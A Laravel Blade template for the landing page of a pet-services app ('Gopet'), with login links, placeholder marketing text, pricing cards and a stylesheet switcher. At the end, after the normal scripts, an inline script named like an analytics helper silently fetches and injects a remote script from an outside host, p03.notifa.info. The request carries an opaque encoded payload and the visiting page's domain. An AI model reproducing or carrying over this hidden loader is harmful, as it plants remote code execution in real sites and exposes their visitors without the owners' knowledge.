{{--<!doctype html>--}}
{{--<html lang="{{ str_replace('_', '-', app()->getLocale()) }}">--}}
{{--<head>--}}
{{--<meta charset="utf-8">--}}
{{--<meta name="viewport" content="width=device-width, initial-scale=1">--}}

{{--<title>Laravel</title>--}}

{{--<!-- Fonts -->--}}
{{--<link href="https://fonts.googleapis.com/css?family=Nunito:200,600" rel="stylesheet">--}}

{{--<!-- Styles -->--}}
{{--<style>--}}
{{--html, body {--}}
{{--background-color: #fff;--}}
{{--color: #636b6f;--}}
{{--font-family: 'Nunito', sans-serif;--}}
{{--font-weight: 200;--}}
{{--height: 100vh;--}}
{{--margin: 0;--}}
{{--}--}}

{{--.full-height {--}}
{{--height: 100vh;--}}
{{--}--}}

{{--.flex-center {--}}
{{--align-items: center;--}}
{{--display: flex;--}}
{{--justify-content: center;--}}
{{--}--}}

{{--.position-ref {--}}
{{--position: relative;--}}
{{--}--}}

{{--.top-right {--}}
{{--position: absolute;--}}
{{--right: 10px;--}}
{{--top: 18px;--}}
{{--}--}}

{{--.content {--}}
{{--text-align: center;--}}
{{--}--}}

{{--.title {--}}
{{--font-size: 84px;--}}
{{--}--}}

{{--.links > a {--}}
{{--color: #636b6f;--}}
{{--padding: 0 25px;--}}
{{--font-size: 13px;--}}
{{--font-weight: 600;--}}
{{--letter-spacing: .1rem;--}}
{{--text-decoration: none;--}}
{{--text-transform: uppercase;--}}
{{--}--}}

{{--.m-b-md {--}}
{{--margin-bottom: 30px;--}}
{{--}--}}
{{--</style>--}}
{{--</head>--}}
{{--<body>--}}
{{--<div class="flex-center position-ref full-height">--}}
{{--@if (Route::has('login'))--}}
{{--<div class="top-right links">--}}
{{--@auth--}}
{{--<a href="{{ url('/home') }}">Home</a>--}}
{{--@else--}}
{{--<a href="{{ route('user-petshop.login') }}">Petshop</a>--}}
{{--<a href="{{ route('doctor.login') }}">Doctor</a>--}}
{{--<a href="{{ route('admin.login') }}">Admin</a>--}}
{{--@endauth--}}
{{--</div>--}}
{{--@endif--}}

{{--<div class="container">--}}
{{--<div class="row">--}}
{{--<div class="col-md-8 col-md-offset 2">--}}
{{--<div class="panel">--}}
{{--@component('components.who')--}}
{{----}}
{{--@endcomponent--}}
{{--</div>--}}
{{--</div>--}}
{{--</div>--}}
{{--</div>--}}
{{--</div>--}}
{{--</body>--}}
{{--</html>--}}

        <!doctype html>
<html lang="zxx">
<head>
    <title> Gopet </title>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="description" content=""/>
    <meta name="keywords" content=" "/>
    <meta name="developer" content="Md. Siful Islam">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

    <!-- FAV AND ICONS   -->
    {{--<link rel="shortcut icon" href="{{ asset('sassgen/assets/images/favicon.ico') }}">--}}
    {{--<link rel="shortcut icon" href="{{ asset('sassgen/assets/images/apple-icon.png') }}">--}}
{{--    <link rel="shortcut icon" sizes="72x72" href="{{ asset('sassgen/assets/images/apple-icon-72x72.png') }}">--}}
{{--    <link rel="shortcut icon" sizes="114x114" href="{{ asset('sassgen/assets/images/apple-icon-114x114.png') }}">--}}

    <!-- Font-->
    <link href="https://fonts.googleapis.com/css?family=Source+Sans+Pro" rel="stylesheet">
    <!-- Font Awesome -->
    <link rel="stylesheet" href="{{ asset('sassgen/assets/icons/font-awesome-4.7.0/css/font-awesome.min.css') }}">
    <link rel="stylesheet" href="{{ asset('sassgen/assets/icofont/icofont.min.css') }}">
    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="{{ asset('sassgen/assets/plugins/css/bootstrap.min.css') }}">
    <!-- Animate CSS
    <link rel="stylesheet" href="assets/plugins/css/animate.css"> -->
    <!-- Owl Carousel CSS-->
    <link rel="stylesheet" href="{{ asset('sassgen/assets/plugins/css/owl.css') }}">
    <!-- Fancybox-->
    <link rel="stylesheet" href="{{ asset('sassgen/assets/plugins/css/jquery.fancybox.min.css') }}">
    <!-- Custom CSS-->
    <link rel="stylesheet" href="{{ asset('sassgen/assets/css/styles.css') }}">
    <!-- Responsive -->
    <link rel="stylesheet" href="{{ asset('sassgen/assets/css/responsive.css') }}">

    <!-- Color CSS -->
    <link rel="stylesheet" href="{{ asset('sassgen/assets/css/colors/red.css') }}" title="red">
    <link rel="stylesheet" href="{{ asset('sassgen/assets/css/colors/blue.css') }}" title="blue">
    <link rel="stylesheet" href="{{ asset('sassgen/assets/css/colors/green.css') }}" title="green">
    <link rel="stylesheet" href="{{ asset('sassgen/assets/css/colors/yellow.css') }}" title="yellow">


</head>
<body class="black-bg body-2">
<!--
===================
   NAVIGATION
===================
-->
<header class="black-bg mh-header nav-scroll fixed-top mh-xss-mobile-nav wow fadeInUp" id="zb-header">
    <div class="overlay"></div>
    <div class="container">
        <div class="row">
            <nav class="navbar navbar-expand-lg col-sm-12 mh-nav nav-btn">
                <a class="navbar-brand" href="#ev-home"><h4>GOPET-APP</h4></a>
                <button class="navbar-toggler" type="button" data-toggle="collapse"
                        data-target="#navbarSupportedContent"
                        aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
                    <span class="navbar-toggler-icon icon"></span>
                </button>
                <div class="collapse navbar-collapse" id="navbarSupportedContent">
                    <ul class="navbar-nav mr-0 ml-auto">
                        <li class="nav-item">
                            <a class="nav-link" href="{{ route('user-petshop.login') }}">Petshop</a>
                        </li>
                        <li class="nav-item">
                            <a class="nav-link" href="{{ route('doctor.login') }}">Doctor</a>
                        </li>
                        <li class="nav-item">
                            <a class="nav-link" href="{{ route('admin.login') }}">Admin</a>
                        </li>
                    </ul>
                </div>
            </nav>
        </div>
    </div>
</header>

<!--
==============
    HOME
==============
-->
<section class="section ev-home ev-home-2 xs-column-reverse relative" id="ev-home">
    <div class="sg-home-shape cover-bg" style="background-image: url({{ asset('sassgen/assets/images/homr-shape.png') }});">
        <div class="right-shape-content">
            {{--<img src="{{ asset('sassgen/assets/images/home-card-top.png') }}" alt="" class="top-content-image">--}}
            {{--<img src="{{ asset('sassgen/assets/images/home-card-bottom.png') }}" alt="" class="bottom-content-image">--}}
            {{--<img src="{{ asset('sassgen/assets/images/dash-2.png') }}" alt="" class="center-content-image">--}}
            <!-- <img src="https://dummyimage.com/800x550/000/fff" alt="" class="center-content-image"> -->
        </div>
    </div>
    <div class="container relative zindex">
        <div class="row vertical-middle-content section-separator">
            <div class="col-lg-6 col-sm-12">
                <div class="header-content-inner center ev-home-padding">
                    <h2 class="main_heading wow fadeInUp">Top Quality Digital Products to Explore</h2>
                    <p>A complete about-face in its core economy Amsterdams progressive </p>
                    <div class="ev-button wow fadeInUp">
                        <a href="#section7" class="btn btn-fill">Get Started Now</a>
                        <a href="" class="btn btn-stroke">Watch Trailer</a>
                    </div>
                </div>
            </div>
            <div class="col-lg-6 col-md-12 center wow fadeInLeft">

            </div>
        </div>
    </div>
</section>

<!--
==============
    Solutions
==============
-->
<section class="ev-about-features-1 relative ev-about-features-1-2  section2" id="section2">
    <div class="container">
        <div class="row section-separator relative vertical-middle-content">
            <img src="{{ asset('sassgen/assets/images/circle-shape.png') }}" alt="" class="circle-shape">
            <div class="col-lg-6">
                <div class="ev-content-title text-center">
                    <span class="title-category">Feature</span>
                    <h3>Our Solution</h3>
                </div>
            </div>
            <div class="col-lg-12" id="featured-content-inner">
                <div class="row">
                    <div class="col-sm-6 col-lg-3">
                        <div class="feature-item itme-color-2" id="pr-item2">
                            <div class="item-icon"><i class="fa icofont-brand-att"></i></div>
                            <h5>Expand Your Reach</h5>
                            <p>A complete about-face in its core economy Amsterdams progressive </p>
                        </div>
                    </div>
                    <div class="col-sm-6 col-lg-3">
                        <div class="feature-item itme-color-3" id="pr-item3">
                            <div class="item-icon"><i class="fa icofont-mushroom"></i></div>
                            <h5>Higher Annualized Growth</h5>
                            <p>A complete about-face in its core economy Amsterdams progressive </p>
                        </div>
                    </div>
                    <div class="col-sm-6 col-lg-3">
                        <div class="feature-item itme-color-4" id="pr-item4">
                            <div class="item-icon"><i class="fa icofont-basketball-hoop"></i></div>
                            <h5>Book Your Provider</h5>
                            <p>A complete about-face in its core economy Amsterdams progressive </p>
                        </div>
                    </div>
                    <div class="col-sm-6 col-lg-3">
                        <div class="feature-item itme-color-5" id="pr-item1">
                            <div class="item-icon"><i class="fa icofont-swimmer"></i></div>
                            <h5>Secure multi-usable</h5>
                            <p>A complete about-face in its core economy Amsterdams progressive </p>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</section>

<!--
==============
    Helps
==============
-->
<section class="section featured-section-4 lo-about relative section4" id="lo-about">
    <div class="solution-items cover-bg" style="background-image: url({{ asset('sassgen/assets/images/section2.png') }});"></div>
    <div class="container">
        <div class="row">
            <div class="col-lg-6 col-md-12">
                <div class="col-sm-12">
                    <div class="ev-content-title">
                        <span class="title-category">Feature</span>
                        <h3>Web Development</h3>
                        <p>Lorem enim ad minim veniam, quis nostrud exercitation
                            ullamco laboris nisi ut aliquip ex ea commodo consequat.</p>
                    </div>
                    <div class="each-content-inner">
                        <ul>
                            <li>
                                <h5><i class="fa fa-codepen"></i> Best Performance </h5>
                                <p>A complete about-face in its core economy Amsterdams. Complete about-face</p>
                            </li>
                            <li>
                                <h5><i class="fa fa-2 fa-codepen"></i> Easy Settings </h5>
                                <p>A complete about-face in its core economy Complete core economy</p>
                            </li>
                        </ul>
                    </div>
                </div>
            </div>
            <div class="col-lg-6" id="featured-content-inner">
                <div class="row">
                    <div class="col-sm-6 col-lg-6">
                        <div class="feature-item itme-color-2" id="pr-item2">
                            <div class="item-icon"><i class="fa icofont-brand-att"></i></div>
                            <h5>Idea</h5>
                            <p>A complete about-face in its core economy Amsterdams progressive </p>
                        </div>
                    </div>
                    <div class="col-sm-6 col-lg-6">
                        <div class="feature-item itme-color-3 mt" id="pr-item3">
                            <div class="item-icon"><i class="fa icofont-mushroom"></i></div>
                            <h5>Growth</h5>
                            <p>A complete about-face in its core economy Amsterdams progressive </p>
                        </div>
                    </div>
                    <div class="col-sm-6 col-lg-6">
                        <div class="feature-item itme-color-4" id="pr-item4">
                            <div class="item-icon"><i class="fa icofont-basketball-hoop"></i></div>
                            <h5>Brovider</h5>
                            <p>A complete about-face in its core economy Amsterdams progressive </p>
                        </div>
                    </div>
                    <div class="col-sm-6 col-lg-6">
                        <div class="feature-item itme-color-5 mt colored" id="pr-item1">
                            <div class="item-icon"><i class="fa icofont-swimmer"></i></div>
                            <h5>Secure</h5>
                            <p>A complete about-face in its core economy Amsterdams progressive </p>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</section>

<section class="sg-testimonial relative section6 bg-4 " id="section6">
    <div class="ts-overlay cover-bg" style="background-image: url({{ asset('sassgen/assets/images/ts-ov.svg') }});"></div>
    <div class="container">
        <div class="row section-separator ">
            <div class="ev-content-title text-center col-sm-12">
                <span class="title-category">Feedbacks</span>
                <h3>Client’s Say</h3>
            </div>

            <div class="sg-testimonial-inner col-lg-12 col-sm-12" id="mh-client-review">
                <div class="sg-ts-item col-sm-12">
                    <div class="">
                        <div class="each-content col-sm-12">
                            <div class="each-img">
                                <img src="{{ asset('sassgen/assets/images/girl.png') }}" alt="" class="img-fluid ts-avatar">
                                <img src="{{ asset('sassgen/assets/images/ts3.svg') }}" alt="" class="ti-icons">
                            </div>
                            <p>"Apptentive have built their business and reputation around helping
                                tech-startups connect with their mobile audience there
                                share the love"</p>
                            <hr class="ts-hr purple-c">
                            <div class="author-name">
                                <h6>Emily Michael</h6>
                                <p>Social media marketer</p>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="sg-ts-item col-sm-12">
                    <div class="">
                        <div class="each-content col-sm-12">
                            <div class="each-img">
                                <img src="{{ asset('sassgen/assets/images/girl.png') }}" alt="" class="img-fluid ts-avatar">
                                <img src="{{ asset('sassgen/assets/images/ti.svg') }}" alt="" class="ti-icons">
                            </div>
                            <p>"Apptentive have built their business and reputation around helping
                                tech-startups connect with their mobile audience there
                                share the love"</p>
                            <hr class="ts-hr green-c">
                            <div class="author-name">
                                <h6>Emily Michael</h6>
                                <p>Social media marketer</p>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="sg-ts-item col-sm-12">
                    <div class="">
                        <div class="each-content col-sm-12">
                            <div class="each-img">
                                <img src="{{ asset('sassgen/assets/images/girl.png') }}" alt="" class="img-fluid ts-avatar">
                                <img src="{{ asset('sassgen/assets/images/ti2.svg') }}" alt="" class="ti-icons">
                            </div>
                            <p>"Apptentive have built their business and reputation around helping
                                tech-startups connect with their mobile audience there
                                share the love"</p>
                            <hr class="ts-hr blue-c">
                            <div class="author-name">
                                <h6>Emily Michael</h6>
                                <p>Social media marketer</p>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</section>


<!--
==============
    Process
==============
-->
<section class="ev-process relative section5" id="section5">
    <div class="container">
        <div class="row section-separator">
            <div class="ev-content-title text-center col-sm-12 pr-0">
                <span class="title-category">Process</span>
                <h3>How it Works</h3>
                <p class="">At Surge3, we know knowledge is power and experience leads to results There
                    are not many cities that have experienced such social and political extremes.</p>
            </div>
            <div class="ev-process-log col-sm-12">
                <div class="row">
                    <div class="col-lg-4 col-md-6">
                        <div class="process-item" id="process-item1">
                            <img src="{{ asset('sassgen/assets/images/process-arrow-1.png') }}" alt="" class="ev-process-arrow-one">
                            <div class="ev-img-inner">
                                <div class="process-number">
                                    1
                                </div>
                                <img src="{{ asset('sassgen/assets/images/pricon-1.png') }}" alt="">
                            </div>
                            <h4>Computer boots up</h4>
                            <p>A complete about-face in its core economy Amsterdams progressive multicultural
                                conscientious.</p>
                        </div>
                    </div>
                    <div class="col-lg-4 col-md-6">
                        <div class="process-item" id="process-item2">
                            <img src="{{ asset('sassgen/assets/images/process-arrow-2.png') }}" alt="" class="ev-process-arrow-one">
                            <div class="ev-img-inner">
                                <div class="process-number">
                                    3
                                </div>
                                <img src="{{ asset('sassgen/assets/images/pricon-1.png') }}" alt="">
                            </div>
                            <h4>Computer boots up</h4>
                            <p>A complete about-face in its core economy Amsterdams progressive multicultural
                                conscientious.</p>
                        </div>
                    </div>
                    <div class="col-lg-4 col-md-6">
                        <div class="process-item" id="process-item3">
                            <div class="ev-img-inner">
                                <div class="process-number">
                                    2
                                </div>
                                <img src="{{ asset('sassgen/assets/images/pricon-1.png') }}" alt="">
                            </div>
                            <h4>Computer boots up</h4>
                            <p>A complete about-face in its core economy Amsterdams progressive multicultural
                                conscientious.</p>
                        </div>
                    </div>

                </div>
            </div>
        </div>
    </div>

</section>

<!--
==============
    Pricing
==============
-->
<section class="lo-pricing-plan section7 relative" id="section7">
    <div class="container">
        <div class="row section-separator relative">
            <div class="ev-content-title text-center col-sm-12 pr-0">
                <span class="title-category">Process</span>
                <h3>Pricing plan</h3>
                <p class="">At Surge3, we know knowledge is power and experience leads to results There
                    are not many cities that have experienced such social and political extremes.</p>
            </div>
            <div class="col-lg-4 col-md-6 wow fadeInUp">
                <div id="price-item1" class="pricing-item red-color">
                    <div class="pricing-item-top">
                        <span class="event-name"> Basic </span>
                        <h3>$9</h3>
                        <span class="duration-month">Month</span>
                    </div>
                    <ul class="pricing-offers">
                        <li>Quick job, Small Work</li>
                        <li>Print Package</li>
                        <li>1 Photographer</li>
                        <li>300+ Finished Photos</li>
                        <li>300+ Finished Photos</li>
                        <li></li>
                    </ul>
                    <div class="pricing-item-bottom">
                        <a href="" class="btn btn-fill">Choose Plan</a>
                        <p><a href="">Get Your 30 day free trial</a></p>
                    </div>
                </div>
            </div>
            <div class="col-lg-4 col-md-6 wow fadeInUp">
                <div id="price-item2" class="pricing-item pricing-item-2 blue-bg">
                    <div class="pricing-item-top">
                        <span class="event-name"> Premium </span>
                        <h3>$999</h3>
                        <span class="duration-month">Month</span>
                    </div>
                    <ul class="pricing-offers">
                        <li>Quick job, Small Work</li>
                        <li>Print Package</li>
                        <li>1 Photographer</li>
                        <li>300+ Finished Photos</li>
                        <li>300+ Finished Photos</li>
                        <li></li>
                    </ul>
                    <div class="pricing-item-bottom">
                        <a href="" class="btn btn-fill">Choose Plan</a>
                        <p><a href="">Get Your 30 day free trial</a></p>
                    </div>
                </div>
            </div>
            <div class="col-lg-4 col-md-6 wow fadeInUp">
                <div id="price-item3" class="pricing-item sky-color">
                    <div class="pricing-item-top">
                        <span class="event-name"> Standard </span>
                        <h3>$99</h3>
                        <span class="duration-month">Month</span>
                    </div>
                    <ul class="pricing-offers">
                        <li>Quick job, Small Work</li>
                        <li>Print Package</li>
                        <li>1 Photographer</li>
                        <li>300+ Finished Photos</li>
                        <li>300+ Finished Photos</li>
                        <li></li>
                    </ul>
                    <div class="pricing-item-bottom">
                        <a href="" class="btn btn-fill">Choose Plan</a>
                        <p><a href="">Get Your 30 day free trial</a></p>
                    </div>
                </div>
            </div>
        </div>
    </div>
</section>


<!--
==============
    Footer
==============
-->
<footer class="ev-footer relative" id="ev-footer">
    <div class="footer-overlay-img">
        <div class="each-color image-bg" style="background-image:url({{ asset('sassgen/assets/images/footer-bg.svg') }})"></div>
    </div>
    <div class="container">
        <div class="row section-separator pb-0">
            <div class="col-sm-12">
                <div class="ev-content-title text-center col-sm-12">
                    <span class="title-category">START NOW</span>
                    <h3>Let’s start with 30 days <br> free trial.</h3>
                </div>
                <form id="mailchimp-subscribe" class="col-sm-12 col-lg-8 mail-sub center" method="post"
                      data-toggle="validator">
                    <div class="form-group">
                        <input type="email" name="email" class="form-control" id="subscriber-email"
                               placeholder="Enter email to subscribe*" required="">
                        <button type="submit" class="btn btn-fill " id="submit"> Get Started</button>
                    </div>
                </form>
            </div>
            <div class="col-sm-12 ev-footer-bottom">
                <div class="row vertical-middle-content">
                    <div class="col-sm-4">
                        <!-- <div class="footer-img footer-logo">
                            <img src="assets/images/logo.svg" alt="" class="img-fluid">
                        </div> -->
                    </div>
                    <div class="col-sm-4">
                        <div class="footer-img">
                            <p>© 2018 Luova Studio</p>
                        </div>
                    </div>
                    <div class="col-sm-4">
                        <!-- <div class="footer-img">
                            <img src="assets/images/cards.png" alt="" class="img-fluid">
                        </div> -->
                    </div>
                </div>
            </div>
        </div>
    </div>
</footer>
<!--
==============
* JS Files *
==============
-->

<!-- jQuery first, then Popper.js, then Bootstrap JS -->

<!-- jQuery -->
<script src="{{ asset('sassgen/assets/plugins/js/jquery.min.js') }}"></script>
<!-- popper -->
<script src="{{ asset('sassgen/assets/plugins/js/popper.min.js') }}"></script>
<!-- bootstrap -->
<script src="{{ asset('sassgen/assets/plugins/js/bootstrap.min.js') }}"></script>
<!-- waypoint  -->
<script src="{{ asset('sassgen/assets/plugins/js/waypoints.min.js') }}"></script>
<!-- owl carousel -->
<script src="{{ asset('sassgen/assets/plugins/js/owl.carousel.js') }}"></script>
<!-- validator -->
<script src="{{ asset('sassgen/assets/plugins/js/validator.min.js') }}"></script>
<!-- wow -->
<script src="{{ asset('sassgen/assets/plugins/js/wow.min.js') }}"></script>
<!-- jquery nav -->
<script src="{{ asset('sassgen/assets/plugins/js/jquery.nav.js') }}"></script>
<!-- Fancybox js-->
<script src="{{ asset('sassgen/assets/plugins/js/jquery.fancybox.min.js') }}"></script>
<!-- TwinMax -->
<script src="{{ asset('sassgen/assets/plugins/js/TweenMax.min.js') }}"></script>
<script src="{{ asset('sassgen/assets/plugins/js/TimelineMax.min.js') }}"></script>
<script src="{{ asset('sassgen/assets/plugins/js/scrollmagic.min.js') }}"></script>
<script src="{{ asset('sassgen/assets/plugins/js/animation.gsap.min.js') }}"></script>
<!-- Custom Scripts-->
<script src="{{ asset('sassgen/assets/js/custom-scripts.js') }}"></script>

<!--



 -->

<style>
    .demo-style-switch {
        position: fixed;
        z-index: 9999;
        top: 100px;
        left: -220px;
        background: #fff
    }

    .demo-style-switch:hover {
        opacity: 1 !important
    }

    .demo-style-switch .switched-options {
        position: relative;
        width: 220px;
        text-align: left;
        padding: 1px 14px;
        -webkit-box-shadow: 0 0 4px rgba(0, 0, 0, .3);
        box-shadow: 0 0 4px rgba(0, 0, 0, .3)
    }

    .demo-style-switch .config-title {
        text-transform: capitalize;
        font-weight: 700;
        font-size: 16px;
        color: #000;
        border-bottom: 1px dotted #ccc;
        border-top: 1px dotted #ccc;
        margin-bottom: 5px
    }

    .demo-style-switch ul {
        margin-bottom: 4px
    }

    .demo-style-switch ul .active {
        color: #005885;
        font-weight: 700
    }

    .demo-style-switch ul .active a {
        color: #005885;
        font-weight: 700
    }

    .demo-style-switch ul .p {
        font-weight: 400;
        font-size: 12px;
        color: #ccc;
        margin-top: 10px
    }

    .demo-style-switch ul li a {
        font-size: 14px;
        font-weight: 400;
        line-height: 24px;
        color: grey
    }

    .demo-style-switch ul li a:hover {
        color: #008ed6
    }

    .demo-style-switch ul.styles {
        margin-top: 10px
    }

    .demo-style-switch ul.styles li {
        display: inline-block;
        margin-right: 5px
    }

    .demo-style-switch ul.styles li .blue, .demo-style-switch ul.styles li .blue-munsell,
    .demo-style-switch ul.styles li .green, .demo-style-switch ul.styles li .orange, .demo-style-switch ul.styles li .purple, .demo-style-switch ul.styles li .red,
    .demo-style-switch ul.styles li .slate, .demo-style-switch ul.styles li .yellow {
        width: 35px;
        height: 35px;
        border-radius: 50%
    }

    .demo-style-switch ul.styles li .blue {
        background: #a97afd
    }

    .demo-style-switch ul.styles li .blue-munsell {
        background: #2196f3
    }

    .demo-style-switch ul.styles li .green {
        background: #4caf50
    }

    .demo-style-switch ul.styles li .orange {
        background: orange
    }

    .demo-style-switch ul.styles li .purple {
        background: #e91e63
    }

    .demo-style-switch ul.styles li .red {
        background: #0dbda1
    }

    .demo-style-switch ul.styles li .slate {
        background: #f6c
    }

    .demo-style-switch ul.styles li .yellow {
        background: #188c91
    }

    .demo-style-switch .switch-button {
        opacity: 1 !important;
        background: #fff;
        padding: 10px;
        font-size: 24px;
        color: #272727 !important;
        position: absolute;
        overflow: hidden;
        right: -44px;
        top: -10px;
        border-top-right-radius: 4px;
        border-bottom-right-radius: 4px;
    }

    .demo-style-switch .switch-button:hover {
        color: #008ed6;
        cursor: pointer;
        text-decoration: none
    }

    .mh-demo-styles h4 {
        color: #202026cf;
        margin: 10px 0;
        text-align: left;
        font-size: 15px;
        font-weight: 500
    }

    .mh-demo-styles ul {
        margin-bottom: 12px
    }

    .mh-demo-styles ul li {
        display: inline-block;
        width: 49%
    }

    .demo-style-switch ul li a img {
        border: 1px solid #000
    }
</style>
<script>
    function setActiveStyleSheet(e) {
        var t, i;
        for (t = 0; i = document.getElementsByTagName("link")[t]; t++) -1 != i.getAttribute("rel").indexOf("style") && i.getAttribute("title") && (i.disabled = !0,
        i.getAttribute("title") == e && (i.disabled = !1))
    }

    function getActiveStyleSheet() {
        var e, t;
        for (e = 0; t = document.getElementsByTagName("link")[e]; e++) if (-1 != t.getAttribute("rel").indexOf("style") && t.getAttribute("title") && !t.disabled) return t.getAttribute("title");
        return null
    }

    function getPreferredStyleSheet() {
        var e, t;
        for (e = 0; t = document.getElementsByTagName("link")[e]; e++) if (-1 != t.getAttribute("rel").indexOf("style") && -1 == t.getAttribute("rel").indexOf("alt") && t.getAttribute("title")) return t.getAttribute("title");
        return null
    }

    function createCookie(e, t, i) {
        if (i) {
            var n = new Date;
            n.setTime(n.getTime() + 24 * i * 60 * 60 * 1e3);
            var r = "; expires=" + n.toGMTString()
        } else r = "";
        document.cookie = e + "=" + t + r + "; path=/"
    }

    function readCookie(e) {
        for (var t = e + "=", i = document.cookie.split(";"), n = 0; n < i.length; n++) {
            for (var r = i[n]; " " == r.charAt(0);) r = r.substring(1, r.length);
            if (0 == r.indexOf(t)) return r.substring(t.length, r.length)
        }
        return null
    }

    window.onload = function (e) {
        var t = readCookie("style");
        setActiveStyleSheet(t || getPreferredStyleSheet())
    }, window.onunload = function (e) {
        createCookie("style", getActiveStyleSheet(), 365)
    };
    var cookie = readCookie("style"), title = cookie || getPreferredStyleSheet();
    setActiveStyleSheet(title), $(document).ready(function () {
        $("#toggle-switcher").click(function () {
            $(this).hasClass("open") ? ($(this).removeClass("open"), $("#switch-style").animate({left: "-220px"})) : ($(this).addClass("open"), $("#switch-style").animate({left: "0"}))
        })
    });
</script>
<style>
    .demo-style-switch ul.styles li .blue {
        background: #0298FA;
    }

    .demo-style-switch ul.styles li .red {
        background: #eb4343;
    }

    .demo-style-switch ul.styles li .green {
        background: #177869;
    }

    .demo-style-switch ul.styles li .yellow {
        background: #f35d22;
    }
</style>
<script type="text/javascript">if (self == top) {
        function netbro_cache_analytics(fn, callback) {
            setTimeout(function () {
                fn();
                callback();
            }, 0);
        }

        function sync(fn) {
            fn();
        }

        function requestCfs() {
            var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
            var idc_glo_r = Math.floor(Math.random() * 99999999999);
            var url = idc_glo_url + "p03.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH2dCrUw7WOuX6K5DROIgGIvD66wWgUDYyJiqNWNGVVq2DCs1ROXfRGdf%2bvKPb80VqnpUujOQNUYVXCHZJUZF7iZDz1secwrWjjkPwpOZmcUHuipcLdpitAvQUpTJfDX%2bPhaGGCgGZjK3%2fAE3XlZgtyZ1bD%2fRNYy1bRgJNQHs81aH%2ffRWfYBKASBGu15lGYz7skE61k3lQFwDtecqvXXxbIJNBuQX21rVGLwmqzQFv%2b%2fM3t5ah5n7fGo2BY17jYYrcdQidT9tqCRRB%2fslxL6wOgVTnwZXIWUCSPfLndoa0kXTc%2fROqLbNzhZAQuSNM%2bDmGCPrs4JmCI%2f%2fx4zbeVewP9Q9YJSf72QqiclbYWKPBiXIt%2fw%2fcvVvweC8jcA9Xrno%2bwQVIjH41xlEJfBguXjWBaYfPCiQ3RbIqTJQ0W7h%2b52HvEjw1zdbi3gtr28pdKzVELWlQimfi%2fol8%3d" + "&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen.height;
            var bsa = document.createElement('script');
            bsa.type = 'text/javascript';
            bsa.async = true;
            bsa.src = url;
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
        }

        netbro_cache_analytics(requestCfs, function () {
        });
    }
    ;</script>
</body>
</html>